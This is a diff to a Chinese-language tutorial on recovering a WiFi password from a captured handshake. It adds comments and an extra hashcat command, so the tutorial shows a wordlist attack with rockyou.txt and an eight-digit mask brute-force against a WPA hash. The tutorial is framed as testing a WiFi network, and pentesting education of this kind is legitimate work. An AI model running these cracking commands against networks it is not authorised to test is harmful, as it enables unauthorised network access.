@@ -118,7 +118,10 @@ hcxpcapngtool -o hash.hc22000 hack-01.cap
 最后使用如下命令，调用`hashcat`爆破即可得到测试WiFI的连接密码
 
 ```bash
+# 使用字典爆破
 hashcat -m 22000 hash.hc22000 rockyou.txt
+# 使用掩码爆破
+hashcat -m 22000 -a 3 hash.hc22000 '?d?d?d?d?d?d?d?d'
 ```
 
 ![](imgs/image-20260526125826380.png)
